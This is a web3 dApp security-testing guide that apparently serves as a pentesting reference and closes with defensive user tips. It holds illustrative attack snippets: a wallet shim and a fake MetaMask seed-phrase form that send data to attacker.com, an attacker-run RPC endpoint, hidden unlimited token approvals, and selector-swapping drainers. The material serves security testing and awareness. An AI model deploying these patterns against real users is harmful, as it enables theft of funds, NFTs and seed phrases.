<web3_dapp_security_guide>
<title>WEB3/DAPP SECURITY</title>

<critical>Web3 dApps interact with blockchain via frontend code, creating unique attack surface. Focus on wallet connection hijacking, transaction simulation, signature request manipulation, frontend contract interaction, RPC endpoint security, and MetaMask/wallet phishing. Frontend is untrusted but controls transaction construction.</critical>

<scope>
- Wallet connection hijacking (MetaMask, WalletConnect)
- Transaction simulation and parameter manipulation
- Signature request manipulation (EIP-191, EIP-712)
- Frontend contract interaction vulnerabilities
- RPC endpoint security and manipulation
- Wallet phishing patterns
- Smart contract call injection from frontend
- Gas price manipulation
- Token approval abuse
</scope>

<methodology>
1. Inspect frontend: JavaScript bundles, Web3/Ethers.js usage
2. Monitor wallet interactions: connection, transactions, signatures
3. Test transaction manipulation: to, value, data parameters
4. Test signature requests: message manipulation
5. Test RPC endpoints: direct interaction, manipulation
6. Test contract calls: function selectors, parameter encoding
7. Test wallet phishing: fake connection popups
8. Test token approvals: unlimited allowances
</methodology>

<wallet_connection_hijacking>
<fake_connection>
// Malicious dApp
window.ethereum = {
    request: async ({method, params}) => {
        if (method === 'eth_requestAccounts') {
            // Return fake address
            return ['0xFakeAddress...'];
        }
        // Log all requests to attacker
        fetch('http://attacker.com/log', {
            method: 'POST',
            body: JSON.stringify({method, params})
        });
    }
};

// Real MetaMask overwritten
</fake_connection>

<connection_phishing>
// Fake MetaMask popup
<div id="fake-metamask">
    <h3>MetaMask</h3>
    <p>Enter seed phrase to connect</p>
    <input type="text" id="seed">
    <button onclick="stealSeed()">Connect</button>
</div>

function stealSeed() {
    const seed = document.getElementById('seed').value;
    fetch('http://attacker.com/steal', {body: seed});
}
</connection_phishing>
</wallet_connection_hijacking>

<transaction_manipulation>
<parameter_tampering>
// Frontend shows: send 1 ETH to charity
// But constructs: send 100 ETH to attacker

const tx = {
    to: '0xAttacker...',  // not charity address
    value: ethers.utils.parseEther('100'),  // not 1 ETH
    data: '0x...'  // malicious contract call
};

await signer.sendTransaction(tx);
</parameter_tampering>

<hidden_transactions>
// Legitimate transaction + hidden malicious
async function donate() {
    // Show this
    await sendDonation();
    
    // Hide this
    await approveUnlimitedTokens();
    await transferAllNFTs();
}
</hidden_transactions>
</transaction_manipulation>

<signature_request_manipulation>
<eip712_abuse>
// EIP-712 typed data signing
const domain = {
    name: 'Legitimate Service',
    version: '1',
    chainId: 1,
    verifyingContract: '0xLegit...'
};

const types = {
    Transfer: [
        {name: 'to', type: 'address'},
        {name: 'amount', type: 'uint256'}
    ]
};

const value = {
    to: '0xAttacker...',  // attacker address, not shown clearly
    amount: '1000000000000000000000'  // 1000 tokens, shown as "1"
};

// User signs, thinking transferring 1 token
const signature = await signer._signTypedData(domain, types, value);
</eip712_abuse>

<message_injection>
// Simple signature (EIP-191)
const message = "Login to app";  // shown
const actualMessage = "Transfer ownership to 0xAttacker";  // signed

const signature = await signer.signMessage(actualMessage);
</message_injection>
</signature_request_manipulation>

<rpc_endpoint_abuse>
<malicious_rpc>
// dApp specifies RPC endpoint
const provider = new ethers.providers.JsonRpcProvider('http://attacker.com/rpc');

// All blockchain data from attacker
// Can show fake balances, transactions, contract state
</malicious_rpc>

<rpc_man_in_middle>
// Intercept and modify RPC responses
await provider.send('eth_call', [
    {
        to: contractAddress,
        data: functionSelector
    },
    'latest'
]);

// Attacker RPC returns fake data
// Shows fake token balance: 1000 (real: 0)
</rpc_man_in_middle>
</rpc_endpoint_abuse>

<contract_call_injection>
<function_selector_manipulation>
// Frontend should call: transfer(address,uint256)
// Selector: 0xa9059cbb

// Malicious: call transferFrom(address,address,uint256)
// Selector: 0x23b872dd

const data = ethers.utils.defaultAbiCoder.encode(
    ['address', 'address', 'uint256'],
    [victimAddress, attackerAddress, amount]
);

const tx = {
    to: tokenContract,
    data: '0x23b872dd' + data.slice(2)  // wrong function
};
</function_selector_manipulation>

<parameter_encoding>
// Encode malicious parameters
const encoded = ethers.utils.defaultAbiCoder.encode(
    ['address', 'uint256'],
    ['0xAttacker...', ethers.utils.parseEther('1000')]
);

// Claim: sending 1 token
// Reality: sending 1000 tokens
</parameter_encoding>
</contract_call_injection>

<token_approval_abuse>
<unlimited_approval>
// Request unlimited token approval
const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

await tokenContract.approve(spenderAddress, maxUint256);

// Spender can drain all tokens anytime
</unlimited_approval>

<multiple_approvals>
// Legitimate approval for dApp
await token1.approve(dapp, amount);

// Hidden malicious approval
await token2.approve(attackerContract, maxUint256);
await nft.setApprovalForAll(attackerContract, true);
</multiple_approvals>
</token_approval_abuse>

<gas_manipulation>
<high_gas_price>
// Set extremely high gas price
const tx = {
    to: recipient,
    value: smallAmount,
    gasPrice: ethers.utils.parseUnits('1000', 'gwei')  // 1000 gwei
};

// User pays massive gas fee for tiny transfer
</high_gas_price>

<gas_estimation_manipulation>
// Override gas estimation
const estimatedGas = await contract.estimateGas.function();

// Frontend shows: $5 gas fee
// Reality: $500 gas fee (manipulated estimate)
</gas_estimation_manipulation>
</gas_manipulation>

<phishing_patterns>
<fake_wallet>
// "Install MetaMask" link to fake extension
<a href="chrome://extensions/fake-metamask.crx">
    <img src="metamask-logo.png">
    Install MetaMask
</a>

// Fake extension steals seed phrases
</fake_wallet>

<urgent_scarcity>
// Social engineering
"⚠️ URGENT: Your wallet will be locked in 5 minutes!"
"🔥 Limited NFT drop: Only 10 remaining!"
"💰 Claim your airdrop NOW or lose it!"

// Pressure users to sign without reviewing
</urgent_scarcity>
</phishing_patterns>

<validation>
1. Inspect JavaScript: Web3.js, Ethers.js usage
2. Monitor wallet: transactions, signatures, approvals
3. Test transaction parameters: to, value, data fields
4. Test signature requests: EIP-712 domain, types, values
5. Check RPC endpoint: where blockchain data comes from
6. Test contract calls: function selectors, encoded parameters
7. Review approvals: unlimited allowances, hidden approvals
8. Demonstrate impact: fund theft, NFT theft, unlimited token approval
</validation>

<impact>
- Wallet draining (malicious transactions)
- Signature abuse (ownership transfer)
- Unlimited token approvals (future theft)
- NFT theft
- Seed phrase theft (phishing)
- Gas fee manipulation (financial loss)
- Fake transaction simulation
</impact>

<pro_tips>
1. Always verify transaction parameters in wallet popup
2. Check contract address is correct (not similar-looking)
3. Reject unlimited token approvals—use exact amounts
4. Verify RPC endpoint is legitimate (not attacker-controlled)
5. Never enter seed phrase on any website
6. Check domain carefully—many phishing sites (metαmask.com)
7. Simulate transactions on Tenderly/BlockScout before signing
8. Use hardware wallet for large holdings
9. Review function selector in transaction data
10. Check gas price is reasonable
11. Revoke unused token approvals regularly
12. Browser extension phishing very common—verify extension ID
</pro_tips>

<remember>Web3 frontend is untrusted—controls transaction construction, RPC endpoints, and presentation. Always verify transaction parameters in wallet, reject unlimited approvals, and never trust frontend-displayed information. Hardware wallets provide transaction signing verification.</remember>
</web3_dapp_security_guide>
